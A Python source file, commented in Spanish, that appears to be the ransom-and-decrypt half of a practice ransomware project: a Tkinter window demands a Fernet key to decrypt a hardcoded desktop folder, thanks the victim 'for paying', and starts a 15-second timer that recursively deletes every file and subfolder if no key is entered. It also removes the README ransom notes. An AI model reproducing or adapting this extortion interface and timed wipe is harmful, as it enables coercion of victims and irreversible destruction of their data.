#Librerias
# OS: Brinda funciones para la interacción con el S.O.
import os

# Tkinter: Proporciona herramientas para la creacion de interfaces graficas, con botones, labels, etc.
import tkinter as tk
from tkinter import messagebox

# Timer: Permite la ejecución de una función después de una cantidad de tiempo. Se usa para crear temporizadores
from threading import Timer

# Fernet: Algoritmo SIMÉTRICO, genera una llave. Cryptography: Brinda herramientas de criptografia.
from cryptography.fernet import Fernet

# PIL: Proporciona funciones para abrir, manipular, crear y guardar imagenes.
from PIL import Image, ImageTk


def cargar_la_llave():
    #Abre el archivo llave en modo lectura binaria. Luego lo lee y devuelve el contenido.
    return open('llave.key', 'rb').read()

def desencriptar(ruta_archivo, key):
    f = Fernet(key)
    #Abre la ruta en modo lectura binaria.
    with open(ruta_archivo, 'rb') as file:
        #Lee el archivo y lo guarda en la variable.
        encriptado_data = file.read()
    #Desencripta el archivo
    desencriptado_data = f.decrypt(encriptado_data)
    with open(ruta_archivo, 'wb') as file:
        #Escribe el resultado del desencriptado.
        file.write(desencriptado_data)

def desencriptar_carpetas_internas(path_directorio, key):
    #os.walk recorre recursivamente la ruta devolviendo los datos en el for.
    for directorio_actual, subdirectorios, archivos in os.walk(path_directorio):
        for nombre_archivo in archivos:
            #os.path.join construye la ruta completa de cada archivo de las iteraciones.
            ruta_archivo = os.path.join(directorio_actual, nombre_archivo)
            desencriptar(ruta_archivo, key)
            
#Elimina el contenido del directorio según la ruta que se le da.
def eliminar_contenido_directorio(path_directorio):
    #os.walk avanza de forma recursiva entre todos los archivos y subdirectorios.
    for root, dirs, files in os.walk(path_directorio):
        for file in files:
            file_path = os.path.join(root, file) #Según las iteraciones que haya este va obteniendo su ruta
            os.remove(file_path) #Lo elimina
        for dir in dirs:
            dir_path = os.path.join(root, dir) #Itera sobre cada subdirectorio
            os.rmdir(dir_path)#Elimina el directorio.

#Desencripta la ruta específica
def desencriptar_directorio():
    clave = entrada_llave.get().encode() #Obtiene la llave y la codifica en formato de bytes
    ruta_directorio = 'C:\\Users\\kevin\\Desktop\\pruebas2'
    desencriptar_carpetas_internas(ruta_directorio, clave) #Utilizando otra función desencripta las carpetas internas
    messagebox.showinfo("Desencriptado", "Proceso de desencriptado completado con éxito. \n !GRACIAS! por pagar.") #Una vez realizado muestra un messangebox.
    ventana.destroy() #Cierra la ventana.

def eliminar_directorio():
    ruta_directorio = 'C:\\Users\\kevin\\Desktop\\pruebas2'
    eliminar_contenido_directorio(ruta_directorio)  
    messagebox.showinfo("Eliminado", "El contenido del directorio ha sido eliminado.")

    # Mostrar una imagen al eliminar los archivos
    imagen = Image.open('waoos.jpeg')
    imagen.show()

    ventana_imagen = tk.Toplevel()
    ventana_imagen.title("Imagen") #Nombre de la ventana.
    ventana_imagen.geometry("300x300") #Dimensiones de  la ventana.

    label_imagen = tk.Label(ventana_imagen, image=imagen)
    label_imagen.pack()

    ventana.destroy()

#Función de la cuenta regresiva
def cuenta_regresiva():
    #Si no se encuentra la llave en el tiempo determinado llama a función de eliminar
    if not entrada_llave.get():
        eliminar_directorio()

#Determina si el modulo actual esta siendo ejecutado como el principal
if __name__ == '__main__':
    path_to_desencrypt = 'C:\\Users\\kevin\\Desktop\\pruebas2'
    os.remove(os.path.join(path_to_desencrypt, 'README.txt'))
    os.remove(os.path.join(path_to_desencrypt, 'README.png'))

# Crea la ventana principal de la aplicación
ventana = tk.Tk()
ventana.title("Desencriptar Directorio")
ventana.geometry("300x200")

# Etiqueta y campo de entrada para la llave
etiqueta_llave = tk.Label(ventana, text="Ingrese la llave de desencriptado:")
etiqueta_llave.pack()
entrada_llave = tk.Entry(ventana, show="*")
entrada_llave.pack()

# Label para mostrar el aviso de eliminación de archivos
label_aviso = tk.Label(ventana, text="!PRECAUCION! Si no coloca la clave en 15 segundos. \n Se eliminaran los archivos")
label_aviso.pack()

# Botón para desencriptar el directorio
boton_desencriptar = tk.Button(ventana, text="Desencriptar Directorio", command=desencriptar_directorio)
boton_desencriptar.pack(pady=10)

# Temporizador para eliminar el contenido del directorio si no se proporciona la clave en 30 segundos
temporizador = Timer(15, cuenta_regresiva)
temporizador.start()

# Ejecutar la ventana principal
ventana.mainloop()


